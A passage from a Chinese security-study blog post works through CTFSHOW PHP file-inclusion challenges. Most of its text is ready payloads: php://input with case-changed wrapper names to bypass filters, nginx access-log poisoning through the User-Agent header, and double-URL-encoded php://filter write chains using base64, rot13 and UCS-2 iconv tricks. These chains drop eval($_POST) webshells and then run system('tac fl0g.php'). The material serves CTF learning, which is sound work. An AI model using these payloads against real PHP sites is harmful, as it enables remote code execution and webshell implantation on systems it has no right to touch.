+</li>
+</ul>
+<blockquote>
+<p>分析需文件名及带有php关键字放弃，故利用日志记录UA信息，UA带入代码包含：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+</blockquote>
+<ol>
+<li>代码给出<strong>include文件包含的关键词</strong></li>
+<li>由于是无文件上传，所以使用<strong>无文件支持伪协议利用</strong></li>
+<li>代码对<strong>php关键词和data关键词过滤</strong></li>
+<li>两种方式</li>
+</ol>
+<ul>
+<li>第一种，使用<strong>文件执行PHP:&#x2F;&#x2F;input</strong>，并使用<strong>大小写绕过</strong>其对php的过滤<ul>
+<li><code>?file=PHP://input POST data：&lt;?=system(&#39;ls&#39;);?&gt;</code>**中写上对应的去掉PHP关键词php语句即可</li>
+<li>**<code>?file=PHP://input POST data：&lt;?=system(&#39;tac fl0g.\*&#39;);?&gt;</code>*<em>中写上对应的去掉PHP关键词php语句，和*<em>文件匹配的后缀，更改为*号绕过检测</em></em></li>
+</ul>
+</li>
+<li>第二种使用：<strong>日志记录文件包含，利用日志记录UA信息，UA带入代码</strong><ul>
+<li>使用文件读取：**<code>file:///var/log/nginx/access.log</code>**读取对应的日志文件内容（绝对路径），成功读取</li>
+<li>通过抓包，抓取到数据包，发送至repeater，并尝试修改UA头中的内容，修改成功，于是尝试在UA头中写入恶意代码<ul>
+<li><code>User-Agent: 222222222&lt;?php=system(&#39;ls&#39;)?&gt;</code>并发送数据包，成功写入，并被解析fl0g.php index.php</li>
+<li><code>User-Agent: 333333333&lt;?php system(&#39;tac fl0g.php&#39;)?&gt;</code>并发送数据包，成功写入，并被解析</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<img src="/img/image-20250528220738661.png" alt="image-20250528220738661" style="zoom:50%;" />
+
+<p><img src="/img/image-20250528221305954.png" alt="image-20250528221305954"></p>
+<p><img src="/img/image-20250528221340653.png" alt="image-20250528221340653"></p>
+<p><img src="/img/image-20250528221603831.png" alt="image-20250528221603831"></p>
+<p><img src="/img/image-20250528222006067.png" alt="image-20250528222006067"></p>
+<p><img src="/img/image-20250528222102565.png" alt="image-20250528222102565"></p>
+<p><img src="/img/image-20250528222121958.png" alt="image-20250528222121958"></p>
+<h4 id="87-php-filter-write-加密编码（文件写入，二次解密）"><a href="#87-php-filter-write-加密编码（文件写入，二次解密）" class="headerlink" title="87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码（文件写入，二次解密）"></a>87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码（文件写入，二次解密）</h4><p><strong>一、利用base64</strong></p>
+<ol>
+<li>正常来讲，浏览器会默认执行URL解码一次，但是提供代码中又加入了一次<strong>urldecode($file)，二次解码，造成之前的过滤失效</strong></li>
+<li>url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;123.php</li>
+<li>Post data:写入&#x3D;&#x3D;<strong>content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs&#x2F;Pg&#x3D;&#x3D;</strong><code>解码为&lt;?php @eval($_POST[a]);?&gt;</code></li>
+<li>通过访问，创建<strong>木马文件123.php</strong></li>
+<li>并通过输入Post data：写入a&#x3D;system(’ls’);</li>
+<li>并通过输入Post data：写入a&#x3D;system(‘tac fl0g.php’);</li>
+</ol>
+<blockquote>
+<p>%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%33%32%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30</p>
+</blockquote>
+<p><img src="/img/image-20250528195546722.png" alt="image-20250528195546722"></p>
+<p><img src="/img/image-20250528200437165.png" alt="image-20250528200437165"></p>
+<p><img src="/img/image-20250528200636166.png" alt="image-20250528200636166"></p>
+<p><img src="/img/image-20250528200742137.png" alt="image-20250528200742137"></p>
+<p><img src="/img/image-20250528200811194.png" alt="image-20250528200811194"></p>
+<hr>
+<p>二、利用凯撒13</p>
+<ol>
+<li>url编码2次：<strong><code>php://filter/write=string.rot13/resource=2.php</code></strong></li>
+<li>Post data:写入&#x3D;&#x3D;<strong>content&#x3D;<?cuc riny($_CBFG[1]);?></strong>&#x3D;&#x3D;</li>
+<li>ROT13解密：<strong><?php eval($_POST[1]);?>（木马设置的密码为：1）</strong></li>
+<li>通过访问，创建<strong>木马文件2.php</strong></li>
+<li>并通过输入Post data：写入1&#x3D;system(’ls’);</li>
+<li>并通过输入Post data：写入1&#x3D;system(‘tac fl0g.php’);</li>
+</ol>
+<blockquote>
+<p>%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%32%25%32%45%25%37%30%25%36%38%25%37%30</p>
+</blockquote>
+<p><img src="/img/image-20250528201730157.png" alt="image-20250528201730157"></p>
+<p><img src="/img/image-20250528205759419.png" alt="image-20250528205759419"></p>
+<p><img src="/img/image-20250528210449863.png" alt="image-20250528210449863"></p>
+<p><img src="/img/image-20250528210459452.png" alt="image-20250528210459452"></p>
+<p><img src="/img/image-20250528210728039.png" alt="image-20250528210728039"></p>
+<h4 id="88-data-base64协议"><a href="#88-data-base64协议" class="headerlink" title="88-data&amp;base64协议"></a>88-data&amp;base64协议</h4><ol>
+<li><strong>过滤PHP，各种符号，php代码编码写出无符号（+和&#x3D;）base64值</strong></li>
+<li>Payload：<strong><code>file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk</code></strong></li>
+<li>解密：<?php system('tac *.php');echo 123;?>ad**（为了去掉+和&#x3D;）</li>
+<li>直接写<?php system('tac *.php');?>，会出现被过滤的号&#x3D;&#x3D;</li>
+</ol>
+<p><img src="/img/image-20250528211333910.png" alt="image-20250528211333910"></p>
+<p><img src="/img/image-20250528211403785.png" alt="image-20250528211403785"></p>
+<h4 id="117-php-filter-write"><a href="#117-php-filter-write" class="headerlink" title="117-php:&#x2F;&#x2F;filter&#x2F;write"></a>117-php:&#x2F;&#x2F;filter&#x2F;write</h4><ul>
+<li>这里可以看到把<strong>将众多编码形式做了过滤包括 <code>http</code>, <code>https</code>, <code>utf</code>, <code>zlib</code>, <code>data</code>, <code>input</code>, <code>rot13</code>, <code>base64</code>, <code>string</code>, <code>log</code>, <code>sess</code>，不区分大小写（<code>i</code> 标志）。</strong></li>
+</ul>
+<p>convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用</p>
+<ol>
+<li>Payload：<strong><code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</code></strong></li>
+<li>Post data 中写入：**<code>contents=**?&lt;hp pvela$(P_SO[T]a;)&gt;?</code></li>
+<li>解码为：<?php eval($_POST[a]);?><strong>（木马设置的密码为：a）</strong></li>
+<li>通过访问，创建<strong>木马文件<code>a.php</code></strong></li>
+<li>并通过输入Post data：写入a&#x3D;system(’ls’);</li>
+<li>并通过输入Post data：写入a&#x3D;system(‘tac flag.php’);</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/* 将字符串 &#x27;&lt;?php eval($_POST[a]);?&gt; 从 UCS-2LE 编码转换为 UCS-2BE 编码*/</span><br><span class="line">$result = iconv(&quot;UCS-2LE&quot;, &quot;UCS-2BE&quot;, &#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);</span><br><span class="line">echo &quot;经过一次反转:&quot;.$result.&quot;\n&quot;;</span><br><span class="line">//经过一次反转:?&lt;hp pvela$(P_SO[T]a;)&gt;?</span><br><span class="line"></span><br><span class="line">// 将经过一次编码转换后的字符串再次从 UCS-2LE 编码转换为 UCS-2BE 编码</span><br><span class="line">echo &quot;经过第二次反转:&quot;.iconv(&quot;UCS-2LE&quot;, &quot;UCS-2BE&quot;, $result);</span><br><span class="line">//经过第二次反转:&lt;?php eval($_POST[a]);?&gt;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\liuyuanbiao\Desktop\BlogPhoto\b5557238cf2a0f800512b67523d97be4./img//img/png" alt="b5557238cf2a0f800512b67523d97be4"><img src="C:\Users\liuyuanbiao\AppData\Roaming\Typora\typora-user-images\image-20250528211643211./img//img/png" alt="image-20250528211643211"></p>
+<p><img src="/img/image-20250528212447630.png" alt="image-20250528212447630"></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121276653">文件包含漏洞+php伪协议</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://0xMouise.github.io">0xMouise</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://0xmouise.github.io/2025/09/16/050-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&amp;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;LFI&amp;RFI&amp;%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95&amp;%E6%97%A0%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8&amp;%E9%BB%91%E7%99%BD%E7%9B%92/">https://0xmouise.github.io/2025/09/16/050-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&amp;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;LFI&amp;RFI&amp;%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95&amp;%E6%97%A0%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8&amp;%E9%BB%91%E7%99%BD%E7%9B%92/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://0xMouise.github.io" target="_blank">0xMouise</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></div><div class="post-share"><div class="social-share" data-image="https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/009b6JyXly1i5fd15gq7dj31hc0xce81.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/16/051-Web%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8&amp;%E7%9B%AE%E5%BD%95%E5%AE%89%E5%85%A8&amp;%E6%B5%8B%E8%AF%95%E6%BA%90%E7%A0%81%E7%AD%89/" title="051-Web攻防-文件安全&amp;目录安全&amp;测试源码等"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5ff9rzye0j31hc0xc7wh.jpg" onerror="onerror=null;src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">051-Web攻防-文件安全&目录安全&测试源码等</div></div><div class="info-2"><div class="info-item-1">051-Web攻防-文件安全&amp;目录安全&amp;测试源码等知识点 1、文件安全-前后台功能点-下载&amp;读取&amp;删除2、目录安全-前后台功能点-目录遍历&amp;目录穿越  演示案例： ➢文件安全-下载&amp;删除-案例黑白盒➢目录安全-遍历&amp;穿越-案例黑白盒  #文件安全-下载&amp;删除-黑白盒1、下载&#x3D;读取（获取源码）文件下载利用：下载敏感文件（数据库配置，中间件配置，系统密匙等文件信息）  常规下载URL：https://67.202.70.133/files/readfile.php （直接访问，会被默认以php执行文件解析，不能下载到本地，也不能看到源码）  可能存在安全URL：https://67.202.70.133/files/readfile.php?file=readfile.php (下载协议下载php文件 ，源码被下载至本地可以被看到)  https://67.202.70.133/files/readfile.php?file=…/index.php https://67.202.70.133/files/rea...</div></div></div></a><a class="pagination-related" href="/2025/09/16/049-WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&amp;%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8&amp;OSS%E5%AF%B9%E8%B1%A1&amp;%E5%88%86%E7%AB%99&amp;%E8%A7%A3%E6%9E%90%E5%AE%89%E5%85%A8&amp;%E8%A7%A3%E7%A0%81%E8%BF%98%E5%8E%9F&amp;%E7%9B%AE%E5%BD%95%E6%89%A7%E8%A1%8C/" title="049-WEB攻防-文件上传&amp;存储安全&amp;OSS对象&amp;分站&amp;解析安全&amp;解码还原&amp;目录执行"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmvo6mj31hc0u04qp.jpg" onerror="onerror=null;src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">049-WEB攻防-文件上传&存储安全&OSS对象&分站&解析安全&解码还原&目录执行</div></div><div class="info-2"><div class="info-item-1">小迪文件上传49~ 笔记总结 #文件-解析方案-执行权限&amp;解码还原1、执行权限 文件上传后存储目录不给执行权限 原理：开启禁止目录执行，将服务器的文件上传后存储目录，取消读取和执行的权限    由于文件上传功能并未做过滤，直接上传包含后门的木马文件shell.php上传成功即可发现，phpinfo被执行了，该文件被解析为php脚本  当在小皮网址配置的&#x3D;&#x3D;选择安全配置→开启禁止目录执行→将禁止执行的目录设置为上传目录（&#x2F;1&#x2F;upload）&#x3D;&#x3D;  开启后，再次访问上传的木马文件，发现报错403，至此文件上传漏洞不能被利用     如何判断 1.如果目录下已经上传进去木马文件，访问其上传路径发现报错403禁止访问，可能是文件上传后存储目录不给执行权限   2、解码还原 数据做存储，解析固定（文件后缀名无关）文件上传后利用编码传输解码还原   当服务器把上传的文件，利用base64编码编码为数据存储，也就是说从根本上解决了文件上传漏洞的问题&#x3D;&#x3D;，以数据存储就没有其他类型的文件解析即使上传后门文件，最...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/09/16/015-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F&WAF&%E8%9C%9C%E7%BD%90%E8%AF%86%E5%88%AB%E9%A1%B9%E7%9B%AE%E7%AD%89/" title="015-信息打点-端口扫描&amp;WAF&amp;蜜罐识别项目等"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmvo6mj31hc0u04qp.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div class="info-item-2">015-信息打点-端口扫描&amp;WAF&amp;蜜罐识别项目等</div></div><div class="info-2"><div class="info-item-1">015-信息打点-端口扫描&amp;WAF&amp;蜜罐识别项目等 本节内容  1、端口扫描-应用&amp;协议2、WAF识别-分类&amp;识别3、蜜罐识别-分类&amp;识别解决：1、Web服务器&amp;应用服务器差异性2、WAF防火墙&amp;安全防护&amp;识别技术3、蜜罐平台&amp;安全防护&amp;识别技术  一.端口扫描-应用&amp;协议 Nmap：配置中：Quick scan plus是快速扫描，intense scan all TCP ports 是全部端口扫描    端口扫描的意义：通过扫描端口是否开放来确定主机上面安装过什么应用，网站应用数据库应用 等…. 在进行端口扫描的时候应该考虑 ：1.防火墙 2.内网环境 防火墙：对端口进行过滤 但不代表端口没有开启 只是没有对外服务 内网环境可能出现的情况：明明数据库端口是开的,网站也能正常打开 但是你对目标进行端口扫描 发现数据库端口没有开放（排除防火墙问题） 二.WAF防火墙&amp;安全防护&amp;识别技术1、WAF解释：Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Applic...</div></div></div></a><a class="pagination-related" href="/2025/09/16/014-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-JS%E6%9E%B6%E6%9E%84&%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB&%E6%B3%84%E6%BC%8F%E6%8F%90%E5%8F%96&API%E6%8E%A5%E5%8F%A3%E6%9E%9A%E4%B8%BE&FUZZ%E7%88%AC%E8%99%AB&%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/" title="014-信息打点-JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fd15ffjaj31hc0xcqth.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div class="info-item-2">014-信息打点-JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目</div></div><div class="info-2"><div class="info-item-1">第14天：信息打点-JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目一.本节知识点1、JS前端架构-识别&amp;分析2、JS前端架构-开发框架分析3、JS前端架构-打包器分析4、JS前端架构-提取&amp;FUZZ解决：1、如何从表现中的JS提取价值信息2、如何从地址中FUZZ提取未知的JS文件3、如何从JS开放框架WebPack进行测试 1.什么是cms CMS（意思为“网站内容管理系统”， 用来管理网站后台，编辑网站前台。）Discuz、WordPress、Ecshop、蝉知等前端技术；HTML5、jquery、bootstrap、Vue等开发语言；PHP、JAVA、Ruby、Python、C#，JS等Web服务器；Apache、Nginx、IIS、lighttpd，Apache等应用服务器：；Tomcat、Jboss、Weblogic、Websphere等数据库类型：；Mysql、SqlServer、Oracle、Redis、MongoDB等操作系统信息；Linux、windows等应用服务信息：；FTP、SSH...</div></div></div></a><a class="pagination-related" href="/2025/09/16/017-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E6%A1%86%E6%9E%B6%E7%BB%84%E4%BB%B6&CMS%E5%B7%A5%E5%85%B7&%E5%85%B6%E4%BB%96%E7%AD%89/" title="017-信息打点-框架组件&amp;CMS工具&amp;其他等"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5ff9rxg1fj31hc0xc4qp.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div class="info-item-2">017-信息打点-框架组件&amp;CMS工具&amp;其他等</div></div><div class="info-2"><div class="info-item-1">017-信息打点-框架组件&amp;CMS工具&amp;其他等 本节课主要知识点 1.CMS识别到后期漏洞利用和代码审计2.开发框架识别到后期漏洞利用和代码审计3.开发组件识别到后期漏洞利用和代码审计 一、CMS指纹识别-不出网程序识别1.概念CMS指纹识别一般能识别到的都是以PHP语言开发的网页为主，其他语言开发的网页识别难度大 识别的意义就是向着对应目标使用对应的工具进行攻击 1.后端：CMS：一般PHP开发居多源码程序（利用源码程序名去搜漏洞情况，源码去下载进行后期的代码审计） 2.前端：JS框架（爬取更多的JS从里面筛选URL或敏感泄漏KEY等）  也是可以通过对JS代码逻辑进行代码审计 3.组件： 组件：第三方的功能模块（日志记录，数据监控，数据转换等）  java居多，常见有过安全漏洞组件（shiro solr log4j sprintboot等） 4.框架： 框架：简单代码的一个整合库，如果使用框架就只需要学习使用框架调用即可 如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用即可 影响：如果采用框架开发，代码的安全性是取决于框架的过滤机制  p...</div></div></div></a><a class="pagination-related" href="/2025/09/16/018-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-APP%E8%B5%84%E4%BA%A7&%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83&%E5%BA%94%E7%94%A8%E7%9B%91%E6%8E%A7&%E9%9D%99%E6%80%81%E6%8F%90%E5%8F%96&%E5%8A%A8%E6%80%81%E6%8A%93%E5%8C%85&%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/" title="018-信息打点-APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5ff9rzvnvj31hc0xc1ky.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div class="info-item-2">018-信息打点-APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试</div></div><div class="info-2"><div class="info-item-1">第18天：信息打点-APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试 本节内容 1、Web&amp;备案信息&amp;单位名称中发现APP2、APP资产静态提取&amp;动态抓包&amp;动态调试解决：1、如何获取到目标APP信息2、如何从APP信息中提取资产  一、如何获取到目标APP信息1.名称获取app信息(爱企查、小蓝本、七麦、点点)1.爱企查知识产权https://aiqicha.baidu.com/  2.七麦、点点查名称[七麦  点点查 2、URL网站备案查APP关于我们 (psbc-ubank.com)（中邮邮惠万家）  1、查备案信息在搜 2、网站上有APP下载 3、市场直接搜单位名称   二、如何从app中收集资产通过获取App配置、数据包，去获取url、api、osskey、js等敏感信息。   资产信息-IP 域名 网站 -转到对应Web测试 接口测试 服务测试 泄露信息-配置key 资源文件 - key（osskey利用，邮件配置等） 代码信息-java代码安全问题- 逆向相关   1、抓包-动态表现优...</div></div></div></a><a class="pagination-related" href="/2025/09/16/016-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-CDN%E7%BB%95%E8%BF%87&%E8%B5%84%E6%BA%90URL&%E5%B7%A5%E5%85%B7%E9%A1%B9%E7%9B%AE%E7%AD%89/" title="016-信息打点-CDN绕过&amp;资源URL&amp;工具项目等"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/009b6JyXly1i5ff9rz4hqj31hc0xcqv5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div class="info-item-2">016-信息打点-CDN绕过&amp;资源URL&amp;工具项目等</div></div><div class="info-2"><div class="info-item-1">016-信息打点-CDN绕过&amp;资源URL&amp;工具项目等 一.相关链接&amp;工具站&amp;项目工具超级Ping：http://www.17ce.com/ 超级Ping：https://ping.chinaz.com/ 接口查询：https://get-site-ip.com/ 接口查询：https://fofa.info/extensions/source 国外请求：https://tools.ipip.net/cdn.php 国外请求：https://boce.aliyun.com/detect/ IP社区库：https://www.cz88.net/geo-public 全网扫描：https://github.com/Tai7sy/fuckcdn 全网扫描：https://github.com/boy-hack/w8fuckcdn 全网扫描：https://github.com/Pluto-123/Bypass_cdn 大佬文章-CDN绕过 https://mp.weixin.qq.com/s/zxEH-HMqKukmq7qXfrdnQQ 二.CND前置知识...</div></div></div></a><a class="pagination-related" href="/2025/09/16/019-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%BB%84%E6%89%8B&%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7&%E4%BE%9D%E8%B5%96%E7%AD%89/" title="019-信息打点-小程序组手&amp;开发工具&amp;依赖等"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/009b6JyXly1i5fd15gq7dj31hc0xce81.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div class="info-item-2">019-信息打点-小程序组手&amp;开发工具&amp;依赖等</div></div><div class="info-2"><div class="info-item-1">019-信息打点-小程序组手&amp;开发工具&amp;依赖等知识点 1、Web&amp;备案信息&amp;单位名称中发现小程序2、小程序资产静态提取&amp;动态抓包&amp;动态调试解决：1、如何获取到目标小程序信息2、如何从小程序中提取资产信息  一.➢小程序获取-各大平台&amp;关键字搜索微信百度支付宝抖音头条  二.小程序主题结构1.主体结构小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。一个小程序主体部分(即app)由三个文件组成，必须放在项目的根目录，如下：    文件 必需 作用    app.js 是 小程序逻辑   app.json 是 小程序公共配置   app.wxss 否 小程序公共样式表   2.一个小程序页面由四个文件组成，分别是:   xxx.js 页面逻辑    xxx.json 页面配置   xxx.wxml 页面结构   xxx.wxss 页面样式   3.项目整体目录结构   pages 页面文件夹    index 首页   logs 日志   utils util 工具类(mina框架自动生成,你也可以建立一个：...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmxlm4j30u00u9wk1.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="avatar"/></div><div class="author-info-name">0xMouise</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">105</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">专注网络安全学习与探索，记录成长与心得分享</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E8%BF%AA%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB50-%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">小迪文件包含50~ 笔记总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E5%8E%9F%E7%90%86-%E5%88%86%E7%B1%BB-%E5%88%A9%E7%94%A8-%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.0.1.</span> <span class="toc-text">文件包含-原理&amp;分类&amp;利用&amp;修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">1、原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">2、漏洞原因：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">3、漏洞简单复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E5%88%86%E7%B1%BB"><span class="toc-number">1.0.1.4.</span> <span class="toc-text">4、分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%EF%BC%9A%EF%BC%88CTFSHOW%EF%BC%89"><span class="toc-number">1.0.1.5.</span> <span class="toc-text">5、白盒审计：（CTFSHOW）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81%E9%BB%91%E7%9B%92%E5%88%86%E6%9E%90%EF%BC%9A"><span 